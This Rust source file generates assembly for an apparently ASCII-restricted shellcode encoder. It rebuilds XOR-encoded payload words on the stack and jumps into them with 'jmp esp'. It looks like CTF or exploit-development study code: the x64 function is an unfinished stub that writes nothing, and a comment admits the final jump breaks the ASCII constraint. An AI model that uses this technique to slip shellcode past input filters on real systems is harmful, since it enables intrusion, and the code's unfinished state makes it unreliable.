use std::fs;
use std::io::prelude::*;

pub fn generate_asm_x86(bytes: &Vec<(u32, u32, u32)>, output: &mut fs::File) -> std::io::Result<()> {
    let mut asm = String::new();
    asm.push_str("section .text\n\n");
    asm.push_str("global _start\n");

    asm.push_str("_start:\n");
    asm.push_str("    pushad\n");

    // eax = any
    // ecx = 0xFFFFFFFF : for xor
    // ebx = original esp
    // esi = -0x30(-48) ~ -0x36(-54) : for index ([esp + esi + xxx])
    asm.push_str("register:\n");
    asm.push_str("    push 0x21\n");
    asm.push_str("    pop eax\n");
    asm.push_str("    xor al , 0x21\n"); // eax = 0x00
    asm.push_str("    dec eax\n");       // eax = 0xFFFFFFFF
    asm.push_str("    push eax\n");
    asm.push_str("    xor al, 0x2f\n");
    asm.push_str("    push eax\n");
    asm.push_str("    pop esi\n");       // esi = 0xFFFFFFFF ^ 0x2f = 0xFFFFFFD0 (-48)
    asm.push_str("    pop ecx\n");       // ecx = 0xFFFFFFFF
    asm.push_str("    push esp\n");
    asm.push_str("    pop ebx\n");       // ebx = original esp + all registers

    asm.push_str("encode:\n");
    for (stand, num1, num2) in bytes.iter().rev() {
        asm.push_str(&format!("; push 0x{:08x}\n", stand ^ num1 ^ num2)); // comment
        // count bits of stand
        let fcnt = stand.count_ones() / 8;
        // if the num of 0xFF in stand is over 2, push 0xFFFFFFFF first
        if fcnt > 2 {
            asm.push_str("    push ecx\n");
            asm.push_str("    pop eax\n");
            asm.push_str(&format!("    xor eax, 0x{:08x}\n", num1));
            asm.push_str(&format!("    xor eax, 0x{:08x}\n", num2));
            asm.push_str("    push eax\n");
            if *stand != 0xFFFFFFFF as u32 {
                for j in 0..4 {
                    if j != 3 && stand & (0xFFFF << (j * 8)) == 0x00000000 as u32 {
                        let idx: u8 = 0x30 + (j as u8);
                        asm.push_str(&format!("    xor [esp + esi + 0x{:02x}], cx\n", idx));
                        break; // there should be no more than 2 0xFF
                    } else if stand & (0xFF << (j * 8)) == 0x00000000 as u32 {
                        let idx: u8 = 0x30 + (j as u8);
                        asm.push_str(&format!("    xor [esp + esi + 0x{:02x}], ch\n", idx));
                    }
                }
            }
        } else {
            // 特例: stand = 0xFF0000FF
            // 0xFFFFFFFFのxorで反転させ，0x0000に対してxorすれば1回のxorで済む
            if *stand == 0xFF0000FF as u32 {
                asm.push_str("    push ecx\n");
                asm.push_str("    pop eax\n");
                asm.push_str(&format!("    xor eax, 0x{:08x}\n", num1));
                asm.push_str(&format!("    xor eax, 0x{:08x}\n", num2));
                asm.push_str("    push eax\n");
                asm.push_str("    xor [esp + esi + 0x31], cx\n");
            } else {
                asm.push_str(&format!("    push 0x{:08x}\n", num1));
                asm.push_str("    pop eax\n");
                asm.push_str(&format!("    xor eax, 0x{:08x}\n", num2));
                asm.push_str("    push eax\n");
                for j in 0..4 {
                    if j != 3 && stand & (0xFFFF << (j * 8)) == 0xFFFF << (j * 8) {
                        let idx: u8 = 0x30 + (j as u8);
                        asm.push_str(&format!("    xor [esp + esi + 0x{:02x}], cx\n", idx));
                        break; // there should be no more than 2 0xFF
                    } else if stand & (0xFF << (j * 8)) == 0xFF << (j * 8) {
                        let idx: u8 = 0x30 + (j as u8);
                        asm.push_str(&format!("    xor [esp + esi + 0x{:02x}], ch\n", idx));
                    }
                }
            }
        }
    }

    asm.push_str("; jmp to shellcode\n");
    asm.push_str("to_shellcode:\n");
    asm.push_str("    jmp esp\n"); // this isn't ASCII!!! NOO

    output.write_all(asm.as_bytes())
}

pub fn generate_asm_x64(bytes: &Vec<(u32, u32, u32)>, output: &mut fs::File) -> std::io::Result<()> {
    let mut asm = String::new();
    asm.push_str("section .text\n\n");
    asm.push_str("global _start\n");

    asm.push_str("_start:\n");
    asm.push_str("    push rax\n");
    asm.push_str("    push rcx\n");
    asm.push_str("    push rdx\n");
    asm.push_str("    push rbx\n");
    asm.push_str("    push rsi\n");

    asm.push_str("register:\n");
    asm.push_str("    push 0x21\n");
    asm.push_str("    pop rax\n");
    asm.push_str("    xor al , 0x21\n"); // rax = 0x00
    asm.push_str("    dec rax\n");       // rax = 0xFFFFFFFF_FFFFFFFF
    asm.push_str("    push rax\n");
    asm.push_str("    xor al, 0x2f\n");  // rax ^= 0x2f = 0xFFFFFFFF_FFFFFFD0 (-48)
    asm.push_str("    push rax\n");
    asm.push_str("    pop rsi\n");       // rsi = 0xFFFFFFFF_FFFFFFD0 (-48)
    asm.push_str("    pop rcx\n");       // rcx = 0xFFFFFFFF_FFFFFFFF
    asm.push_str("    push rsp\n");
    asm.push_str("    pop rbx\n");       // rbx = original rsp + some registers


    
    Ok(())
}